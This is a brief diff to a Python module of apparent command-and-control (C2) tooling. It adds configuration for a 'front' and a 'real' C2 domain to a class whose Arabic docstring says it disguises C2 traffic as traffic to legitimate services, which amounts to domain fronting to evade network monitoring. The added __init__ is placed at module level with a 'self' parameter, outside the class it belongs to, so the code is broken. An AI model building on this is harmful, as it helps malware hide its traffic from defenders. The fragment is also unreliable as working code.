@@ -11,10 +11,13 @@ import hashlib
 import logging
 from typing import Dict, Optional, Tuple
 from cryptography.fernet import Fernet
+from core.config import settings
 
 logger = logging.getLogger(__name__)
 
-
+def __init__(self):
+    self.front_domain = settings.C2_FRONT_DOMAIN
+    self.real_domain = settings.C2_REAL_DOMAIN
 class HTTPSMimicry:
     """
     يجعل الـ C2 traffic يبدو كـ traffic عادي لـ legitimate services
